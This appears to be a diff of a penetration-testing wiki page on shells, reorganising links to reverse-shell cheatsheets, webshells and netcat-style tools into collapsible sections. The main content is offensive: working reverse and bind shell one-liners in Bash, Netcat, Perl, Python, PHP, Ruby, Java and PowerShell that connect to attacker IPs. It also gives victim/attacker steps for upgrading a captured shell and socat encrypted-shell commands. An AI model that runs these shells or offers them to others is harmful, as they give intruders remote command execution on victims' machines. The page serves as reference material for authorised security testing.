@@ -1,8 +1,54 @@
 # Shells
 
+## Shell Guides and Resources
+
+{% tabs %}
+{% tab title="Shell Cheatsheets" %}
+* [PayloadsAllTheThings/ReverseShellCheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+* [Pentest monkey Rshell cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)&#x20;
+* [CTF Notes Reverse shell cheatsheet](https://github.com/Shiva108/CTF-notes/blob/master/rvshell\_cheatsheet.html)&#x20;
+* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
+{% endtab %}
+
+{% tab title="Spawning a TTY Shell" %}
+### [Spawning a TTY Shell](https://netsec.ws/?p=337)
+{% endtab %}
+
+{% tab title="Upgrading a Shell" %}
+### **Upgrading a shell**
+
+****[**https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/**](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)****
+
+**Reverse shell Upgrade to Fully interactive - Linux**&#x20;
+
+* Method 1&#x20;
+  * Simply add 2&>1 to the end of the command&#x20;
+* Method 2&#x20;
+  * (Victim) # python -c "import pty; pty.spawn('/bin/bash')"&#x20;
+  * (Victim # export TERM=xterm&#x20;
+  * (Victim) -Now Ctrl + z to background your reverse shell&#x20;
+  * (Attacker) # stty raw -echo; fg&#x20;
+  * (Victim) # reset&#x20;
+  * _\*_If looks wonky&#x20;
+    * (Attacker) # stty size&#x20;
+    * (Victim) # stty -rows \[#] -columns \[#]&#x20;
+* Method 3&#x20;
+  * \#sudo apt install rlwrap&#x20;
+  * \# rlwrap nc -lvnp&#x20;
+  * \# stty raw -echo; fg&#x20;
+* Method 4&#x20;
+  * Use Socat
+* [https://netsec.ws/?p=337](https://netsec.ws/?p=337)
+* [https://xapax.github.io/security/#post\_exploitation/spawning\_shells/](https://xapax.github.io/security/#post\_exploitation/spawning\_shells/)
+* [https://pentestmonkey.net/blog/post-exploitation-without-a-tty](https://pentestmonkey.net/blog/post-exploitation-without-a-tty)
+{% endtab %}
+{% endtabs %}
+
 ## **Shells**
 
-### **Shell Collections**
+<details>
+
+<summary>Shell Collections</summary>
 
 * Impacket remote execution scripts
   * [psexec.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket\_0\_9\_21/examples/psexec.py) PSEXEC like functionality example using [RemComSvc](https://github.com/kavika13/RemCom)&#x20;
@@ -16,7 +62,11 @@
 * [https://xapax.github.io/security/#tools/webshell/](https://xapax.github.io/security/#tools/webshell/)
 * _Operator Handbook: Reverse Shells - pg. 267_
 
-### **Shell Tools**
+</details>
+
+<details>
+
+<summary>Misc Shells and Tools</summary>
 
 * [dbd](https://www.kali.org/tools/dbd/) - dbd is a Netcat-clone, designed to be portable and offer strong encryption. It runs on Unix-like operating systems and on Microsoft Win32. dbd features AES-CBC-128 + HMAC-SHA1 encryption (by Christophe Devine), program execution (-e option), choosing source port, continuous reconnection with delay, and some other nice features.
 * [sbd](https://www.kali.org/tools/sbd/) - sbd is a Netcat-clone, designed to be portable and offer strong encryption. It runs on Unix-like operating systems and on Microsoft Win32. sbd features AES-CBC-128 + HMAC-SHA1 encryption (by Christophe Devine), program execution (-e option), choosing source port, continuous reconnection with delay, and some other nice features. sbd supports TCP/IP communication only.
@@ -31,12 +81,15 @@
 * [ibombshell](https://www.kali.org/tools/ibombshell/) - This package contains a tool written in Powershell that allows you to have a prompt at any time with post-exploitation functionalities (and in some cases exploitation).
   * [https://github.com/Telefonica/ibombshell](https://github.com/Telefonica/ibombshell)
 * [Weevly webshell ](https://github.com/epinna/weevely3)- Weevely is a web shell designed for post-exploitation purposes that can be extended over the network at runtime.
+  * [https://www.youtube.com/watch?v=Ig-HS6kxz4Q](https://www.youtube.com/watch?v=Ig-HS6kxz4Q)
 * [PyShell](https://github.com/JoelGMSec/PyShell) - Multiplatform Python WebShell. This tool helps you to obtain a shell-like interface on a web server to be remotely accessed. Unlike other webshells, the main goal of the tool is to use as little code as possible on the server side, regardless of the language used or the operating system of the server.
   * [https://www.kitploit.com/2022/03/pyshell-multiplatform-python-webshell.html?m=1](https://www.kitploit.com/2022/03/pyshell-multiplatform-python-webshell.html?m=1)
 
-{% embed url="https://youtu.be/Ig-HS6kxz4Q" %}
+</details>
 
-### SSH
+<details>
+
+<summary>SSH</summary>
 
 * Basic Use: #ssh \[user]@\[host]&#x20;
 * Use a specific key and port: #ssh -i \~/.ssh/id\_rsa -p \[port] \[user]@\[host]&#x20;
@@ -89,7 +142,11 @@
 
     The others configuring server.org:1080 as their SOCKS4/5 proxy. They can now connect to _any_ computer on _any port_ that your computer has access to. This includes access to computers behind your firewall that are on your local network. An alternative and without the need for a server is to use [gs-netcat](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet#bdra-anchor).
 
-### [**Netcat**](http://netcat.sourceforge.net/) **** - The original shell tool.&#x20;
+</details>
+
+<details>
+
+<summary><a href="http://netcat.sourceforge.net/">Netcat - The original shell tool.</a></summary>
 
 * Reference
   * [SANS netcat cheatsheet](https://www.sans.org/security-resources/sec560/netcat\_cheat\_sheet\_v1.pdf)
@@ -123,7 +180,13 @@
   * \#mkfifo /tmp/f; nc -lvnp  < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
 * _Operator Handbook: Netcat - pg. 209_
 
+</details>
+
 {% embed url="https://youtu.be/KlzSBk7VMss" %}
+
+<details>
+
+<summary><a href="http://manpages.org/socat">Socat - The upgraded and encryptable Netcat</a></summary>
 
 ### ****[**Socat**](http://manpages.org/socat) **-** The upgraded and encryptable Netcat
 
@@ -151,6 +214,12 @@
     * \#socat OPENSSL-LISTEN:,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes      - Target
     * \#socat OPENSSL::,verify=0 -                                                                                -Attacker
 * [https://www.hackingarticles.in/socat-for-pentester/](https://www.hackingarticles.in/socat-for-pentester/)
+
+</details>
+
+<details>
+
+<summary><a href="https://github.com/besimorhino/powercat">Powercat - Netcat: The powershell version. </a></summary>
 
 ### [**Powercat**](https://github.com/besimorhino/powercat) **** - Netcat: The powershell version. (Powershell Version 2 and Later Supported)
 
@@ -189,6 +258,8 @@
     * \> powershell.exe -E \[encoded command string]
 * [https://www.hackingarticles.in/powercat-for-pentester/](https://www.hackingarticles.in/powercat-for-pentester/)
 
+</details>
+
 ### [pwncat](https://www.kali.org/tools/pwncat/)&#x20;
 
 This package contains Netcat on steroids with Firewall, IDS/IPS evasion, bind and reverse shell, self-injecting shell and port forwarding magic - and its fully scriptable with Python (PSE).
@@ -196,6 +267,10 @@ This package contains Netcat on steroids with Firewall, IDS/IPS evasion, bind an
 ### [gsocket](https://github.com/hackerschoice/gsocket)
 
 Connect like there is no firewall. Securely. The Global Socket Tookit allows two users behind NAT/Firewall to establish a TCP connection with each other. Securely. More on [https://www.gsocket.io](https://www.gsocket.io).
+
+<details>
+
+<summary>gsocket resources</summary>
 
 The Global Socket Toolkit comes with a set of tools:
 
@@ -223,71 +298,67 @@ gs-netcat -s MySecret -i
 
 Use -T to tunnel trough TOR.
 
-## Shell Guides and Resources
+</details>
 
-### **Shell Cheatsheets**
+#### Shell One-Liners
 
-* [PayloadsAllTheThings/ReverseShellCheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
-* [Pentest monkey Rshell cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)&#x20;
-* [CTF Notes Reverse shell cheatsheet](https://github.com/Shiva108/CTF-notes/blob/master/rvshell\_cheatsheet.html)&#x20;
-* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
+<details>
 
-### [Spawning a TTY Shell](https://netsec.ws/?p=337)
-
-### **Upgrading a shell**
-
-****[**https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/**](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)****
-
-**Reverse shell Upgrade to Fully interactive - Linux**&#x20;
-
-* Method 1&#x20;
-  * Simply add 2&>1 to the end of the command&#x20;
-* Method 2&#x20;
-  * (Victim) # python -c "import pty; pty.spawn('/bin/bash')"&#x20;
-  * (Victim # export TERM=xterm&#x20;
-  * (Victim) -Now Ctrl + z to background your reverse shell&#x20;
-  * (Attacker) # stty raw -echo; fg&#x20;
-  * (Victim) # reset&#x20;
-  * _\*_If looks wonky&#x20;
-    * (Attacker) # stty size&#x20;
-    * (Victim) # stty -rows \[#] -columns \[#]&#x20;
-* Method 3&#x20;
-  * \#sudo apt install rlwrap&#x20;
-  * \# rlwrap nc -lvnp&#x20;
-  * \# stty raw -echo; fg&#x20;
-* Method 4&#x20;
-  * Use Socat
-* [https://netsec.ws/?p=337](https://netsec.ws/?p=337)
-* [https://xapax.github.io/security/#post\_exploitation/spawning\_shells/](https://xapax.github.io/security/#post\_exploitation/spawning\_shells/)
-* [https://pentestmonkey.net/blog/post-exploitation-without-a-tty](https://pentestmonkey.net/blog/post-exploitation-without-a-tty)
-
-## Shell One-Liners
-
-
+<summary>Shell One-Liners</summary>
 
 * Bash&#x20;
   * bash -i >& /dev/tcp/10.0.0.1/8080 0>&1&#x20;
+
+<!---->
+
 * Netcat with out -e flag&#x20;
   * \#rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f&#x20;
+
+<!---->
+
 * Netcat&#x20;
   * \#nc -e /bin/sh 10.10.10.10 4443&#x20;
+
+<!---->
+
 * Netcat windows&#x20;
   * \#nc -e cmd.exe 10.10.10.10 4443&#x20;
+
+<!---->
+
 * Perl&#x20;
   * perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF\_INET,SOCK\_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr\_in($p,inet\_aton($i)))){open(STDIN,">\&S");open(STDOUT,">\&S");open(STDERR,">\&S");exec("/bin/sh -i");};'&#x20;
+
+<!---->
+
 * Python&#x20;
   * python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"]);'&#x20;
+
+<!---->
+
 * PHP&#x20;
   * php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'&#x20;
+
+<!---->
+
 * Ruby&#x20;
   * ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to\_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'&#x20;
+
+<!---->
+
 * Java&#x20;
   * r = Runtime.getRuntime()&#x20;
   * p = r.exec(\["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String\[])&#x20;
   * p.waitFor()&#x20;
+
+<!---->
+
 * Powershell - reverse shell&#x20;
   * \>powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();\[byte\[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = (\[text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"&#x20;
+
+<!---->
+
 * Powershell Bind shell&#x20;
   * \>powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();\[byte\[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = (\[text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
 
-### ****
+</details>
